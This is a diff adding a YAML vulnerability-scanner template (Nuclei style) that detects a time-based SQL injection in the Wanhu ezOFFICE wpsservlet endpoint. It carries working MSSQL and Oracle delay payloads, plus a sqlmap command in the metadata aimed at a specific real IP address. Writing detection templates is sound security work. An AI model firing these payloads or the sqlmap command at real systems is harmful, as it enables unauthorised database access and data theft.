@@ -1,0 +1,48 @@
+id: wanhu-ezoffice-wpsservlet-sqli
+
+info:
+  name: 万户 ezoffice wpsservlet - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: 
+    sqlmap: sqlmap -u "http://39.100.12.65:7001/defaultroot/wpsservlet?option=getSignPicture&signatureID=1" -p signatureID --batch --dbms=mssql --risk 3 --level 5 --technique=T
+  tags: wanhu,oa,sqli,time,ezoffice
+
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        GET /defaultroot/wpsservlet?option=getSignPicture&signatureID=1;WAITFOR%20DELAY%20'0:0:6'-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Moziilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+    
+    matchers:
+      - type: dsl
+        name: mssql
+        dsl:
+          - status_code == 200 
+          - duration >= 5 && duration < 9
+          - contains_all(body,'code','message')
+        condition: and
+  
+  - raw:
+      - |
+        @timeout: 15s
+        GET /defaultroot/wpsservlet?option=getSignPicture&signatureID=1+AND+8579=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(97)||CHR(72)||CHR(98),6)+AND+'TZFK'='TZFK --+z HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Moziilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+    
+    matchers:
+      - type: dsl
+        name: oracle
+        dsl:
+          - status_code == 200 
+          - duration >= 5 && duration < 9
+          - contains_all(body,'code','message')
+        condition: and
